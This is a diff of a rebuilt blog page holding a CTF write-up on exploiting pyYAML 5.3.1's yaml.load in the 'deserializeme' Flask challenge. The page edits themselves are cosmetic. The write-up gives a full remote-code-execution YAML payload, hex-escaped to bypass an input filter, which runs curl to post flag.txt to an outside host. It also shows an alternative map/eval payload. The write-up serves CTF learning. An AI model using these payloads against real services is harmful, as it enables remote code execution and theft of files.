@@ -14,14 +14,14 @@ The server is using pyYAML and Flask, with the source code below:
 from flask import Flask, session, request, make_response import yaml import re import os app = Flask(__name__) app.secret_key = os.urandom(16) @app.route(&#39;/&#39;, methods=[&#34;POST&#34;]) def pwnme(): if not re.fullmatch(b&#34;^[\n --/-\]a-}]*$&#34;, request.data, flags=re.MULTILINE): return &#34;Nice try!&#34;, 400 return yaml.load(request.data) if __name__ == &#39;__main__&#39;: app.">
 <meta name="author" content="harrier, ozetta">
 <link rel="canonical" href="https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/" />
-<link href="/assets/css/stylesheet.min.933fbeab943585aa913b5175ee7291733f28815597926f1e56aacc964d807245.css" integrity="sha256-kz&#43;&#43;q5Q1haqRO1F17nKRcz8ogVWXkm8eVqrMlk2AckU=" rel="preload stylesheet"
+<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
     as="style">
 
 <link rel="icon" href="https://b6a.black/favicon.ico">
 
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.91.0" />
 
 
 
@@ -153,7 +153,7 @@ July 22, 2020&nbsp;·&nbsp;harrier, ozetta
 <p>This was a fun challenge exploiting a deserialize service in Python.</p>
 
 <p>The server is using <a href="https://github.com/yaml/pyyaml/tree/5.3.1">pyYAML</a> and Flask, with the source code below:</p>
-<pre><code class="language-python=" data-lang="python=">from flask import Flask, session, request, make_response
+<pre tabindex="0"><code class="language-python=" data-lang="python=">from flask import Flask, session, request, make_response
 import yaml
 import re
 import os
@@ -174,7 +174,7 @@ if __name__ == &#39;__main__&#39;:
 <p>The version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.</p>
 
 <p>We noticed that <code>yaml.load</code> is &quot;unsafe&quot; by the README:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">When LibYAML bindings are installed, you may use fast LibYAML-based
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">When LibYAML bindings are installed, you may use fast LibYAML-based
 parser and emitter as follows:
 
     &gt;&gt;&gt; yaml.load(stream, Loader=yaml.CLoader)
@@ -186,12 +186,12 @@ If you don&#39;t trust the input stream, you should use:
 <p>So we dig into the internals of yaml loader.</p>
 
 <p>From the source code, when loader is not provided, it uses <code>FullLoader</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load</span>(stream, Loader<span style="color:#f92672">=</span>None):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load</span>(stream, Loader<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
     <span style="color:#e6db74">&#34;&#34;&#34;
 </span><span style="color:#e6db74">    Parse the first YAML document in a stream
 </span><span style="color:#e6db74">    and produce the corresponding Python object.
 </span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
-    <span style="color:#66d9ef">if</span> Loader <span style="color:#f92672">is</span> None:
+    <span style="color:#66d9ef">if</span> Loader <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
         load_warning(<span style="color:#e6db74">&#39;load&#39;</span>)
         Loader <span style="color:#f92672">=</span> FullLoader
 
@@ -209,7 +209,7 @@ If you don&#39;t trust the input stream, you should use:
 (With the POC <a href="https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1">here</a>)</p>
 
 <p>The CVE-2020-1747 exploits the fact that user can input a object with a customized <code>extend</code> function, so that after the object is constructed (with <code>python/object/new</code> / <code>python/object/apply</code>), it can trigger the function <code>extend</code> as it is used by the constructor as below:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construct_python_object_apply</span>(self, suffix, node, newobj<span style="color:#f92672">=</span>False):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construct_python_object_apply</span>(self, suffix, node, newobj<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
         <span style="color:#f92672">...</span>
         instance <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>make_python_instance(suffix, node, args, kwds, newobj)
         <span style="color:#66d9ef">if</span> state:
@@ -221,7 +221,7 @@ If you don&#39;t trust the input stream, you should use:
                 instance[key] <span style="color:#f92672">=</span> dictitems[key]
         <span style="color:#66d9ef">return</span> instance</code></pre></div>
 <p>While the format of <code>python/object/apply</code> can supply states for the object, we can use <code>python/name</code> to reference a python internal function (exec, eval etc). We cannot use an module function as <code>.</code> and <code>_</code> is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by <code>FullConstructor</code>)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#   !!python/object/apply       # (or !!python/object/new)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#   !!python/object/apply       # (or !!python/object/new)</span>
 <span style="color:#75715e">#   args: [ ... arguments ... ]</span>
 <span style="color:#75715e">#   kwds: { ... keywords ... }</span>
 <span style="color:#75715e">#   state: ... state ...</span>
@@ -232,18 +232,18 @@ If you don&#39;t trust the input stream, you should use:
 <p>The 5.3.1 fixes also blocked the key <code>extend</code> and <code>^__.*__$</code> to disallow setting those key with the state parameter.</p>
 
 <p>We discovered that we can use <code>python/object/new</code> with <code>type</code> constructor (<code>type</code> is a type...) to create new types with some customized internal state. With this, we can bypass the <code>state</code> key block mechanism and freely set our object to something like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
   args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]</code></pre></div>
 <p>With this we can put our commands to <code>listitems</code>, and the constructor will call <code>instance.extend(listitems)</code>, thus finish our RCE exploit.</p>
 
 <p>Full payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:type
   args: [&#34;z&#34;, !!python/tuple [], {&#34;extend&#34;: !!python/name:exec }]
   listitems: &#34;\x5f\x5fimport\x5f\x5f(&#39;os&#39;)\x2esystem(&#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&#39;)&#34;</code></pre></div>
 <p>(We changed <code>_</code> to <code>\x5f</code> and <code>.</code> to <code>\x2e</code> to bypass the regex limitation)</p>
 
 <p>The intended solution uses <code>map</code> as a type (as it is a type in Python 3):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &#39;PAYLOAD_HERE&#39; ]]]</code></pre></div>
 <p>This is essentially the python code <code>tuple(map(eval, &quot;PAYLOAD&quot;)))</code>, and this works as <code>map</code> and <code>tuple</code> are both class constructor (so it doesnt use any function as apply calls).</p>
 
 <p>Thanks for the author for such cool challenge (basically used a 0day for the CTF challenge).</p>
@@ -305,7 +305,7 @@ If you don&#39;t trust the input stream, you should use:
   })();
 </script>
     </main><footer class="footer">
-    <span>&copy; 2021 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&copy; 2022 <a href="https://b6a.black/">Black Bauhinia</a></span>
     <span>&middot;</span>
     <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
     <span>&middot;</span>
@@ -329,7 +329,7 @@ If you don&#39;t trust the input stream, you should use:
 
 
 
-<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
     onload="hljs.initHighlightingOnLoad();"></script>
 <script>
     window.onload = function () {
